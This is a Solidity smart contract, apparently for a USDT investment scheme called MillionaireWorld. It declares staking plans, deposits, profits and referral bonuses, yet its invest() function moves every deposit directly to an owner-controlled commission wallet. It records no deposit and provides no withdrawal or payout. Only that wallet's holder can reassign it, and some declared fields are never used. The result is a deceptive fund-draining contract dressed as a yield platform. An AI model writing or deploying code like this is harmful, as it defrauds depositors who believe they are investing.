contract MillionaireWorld {
	using SafeMath for uint256;

	uint256 public totalStaked;
	uint256 public totalRefBonus;
    IBEP20 private usdt;
    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 percent;
		uint256 amount;
		uint256 profit;
		uint256 start;
		uint256 finish;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;

		uint256 bonus;
		uint256 totalBonus;
	}

	mapping (address => User) internal users;

	address private commissionWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user,uint256 amount,uint256 start);

	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address _usdtAddr,address wallet) {
		require(!isContract(wallet));
		commissionWallet = wallet;
        usdt = IBEP20(_usdtAddr);
   
	}

    function invest(uint256 _amount) external  {

        User storage user = users[msg.sender];

        usdt.transferFrom(msg.sender, commissionWallet, _amount);	

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            emit Newbie(msg.sender);
        }

        totalStaked = totalStaked.add(_amount);
        emit NewDeposit(msg.sender ,_amount,block.timestamp);
    }

    function getContractBalance(address userAddress) public view returns (uint256) {
        return usdt.balanceOf(userAddress);
    }


     function changedevAddress(address _devAddress) public
    {
        require(msg.sender==commissionWallet,"Only owner");
        commissionWallet=_devAddress;
    }
    
    

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}